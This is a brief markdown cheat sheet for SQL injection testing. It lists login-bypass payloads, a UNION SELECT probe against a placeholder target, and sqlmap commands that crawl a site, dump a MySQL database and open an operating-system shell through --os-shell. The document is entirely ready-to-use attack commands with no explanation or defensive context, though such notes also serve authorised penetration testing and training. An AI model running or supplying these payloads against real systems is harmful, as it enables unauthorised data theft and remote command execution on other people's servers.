# Manual Testing
## Testing for Bypasses:

- `' or 1=1 LIMIT 1 --`
- `' or 1=1 LIMIT 1 -- -`
- `' or 1=1 LIMIT 1#`
- `'or 1#`
- `' or 1=1 --`
- `' or 1=1 -- -`

## Testing for a row:
- `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`

# SQLMAP
## sqlmap Crawl
- `sqlmap -u http://172.21.0.0 --crawl=1`

## sqlmap Dump Database
- `sqlmap -u http://172.21.0.0 --dbms=mysql --dump`

## sqlmap Shell
- `sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell`